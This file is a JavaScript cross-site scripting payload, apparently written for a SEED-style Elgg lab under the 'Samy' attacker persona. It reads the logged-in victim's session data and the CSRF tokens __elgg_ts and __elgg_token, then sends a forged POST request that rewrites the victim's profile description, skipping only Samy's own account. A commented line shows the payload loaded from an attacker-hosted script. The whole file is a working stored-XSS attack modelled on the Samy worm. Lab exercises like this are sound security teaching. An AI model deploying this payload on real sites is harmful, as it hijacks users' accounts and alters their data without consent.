//<script type="text/javascript" src="http://www.xsslabattacker.com/edit_profile.js"></script>


window.onload = function(){
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName=elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var description = "&description=SAMY is the one true King";	
    var accesslevel = "&accesslevel[description]=2";
    //Construct the content of your url.
    var content=token + ts + userName + description + accesslevel + guid; 
    var samyGuid=47; 
    var sendurl="http://www.xsslabelgg.com/action/profile/edit";
    if(elgg.session.user.guid!=samyGuid)
    {
        //Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
